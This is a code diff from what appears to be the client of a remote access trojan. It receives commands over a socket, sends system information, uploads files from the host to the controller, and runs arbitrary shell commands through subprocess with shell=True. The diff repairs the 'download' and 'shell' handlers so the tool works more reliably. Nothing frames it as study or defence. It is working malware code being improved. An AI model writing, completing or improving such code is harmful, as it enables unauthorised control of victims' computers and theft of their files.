@@ -57,20 +57,22 @@ Processor Architecture: {platform.processor()}
             sock.send(sysinfo.encode())
 
         elif cmd.split(" ")[0] == "download":
-            with open(cmd.split(" ")[1], "rb") as f:
-                file_data = f.read(1024)
-                while file_data:
-                    sock.send(file_data)
+            if len(cmd.split(" ")) < 3:
+                sock.send("Usage: download <remote_file> <local_path>".encode())
+            else:
+                with open(cmd.split(" ")[1], "rb") as f:
                     file_data = f.read(1024)
-                sleep(2)
-                sock.send(b"DONE")
+                    while file_data:
+                        sock.send(file_data)
+                        file_data = f.read(1024)
+                    sock.send(b"DONE")
 
         elif cmd == "exit":
             sock.send(b"exit")
             break
 
         elif cmd.split(" ")[0] == "shell":
-            if len(cmd) < 2:
+            if len(cmd.split(" ")) < 2:
                 sock.send("Usage: shell <command>".encode())
             else:
                 comm = subprocess.Popen(str(cmd.split(cmd.split(" ")[0])[1].strip()), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
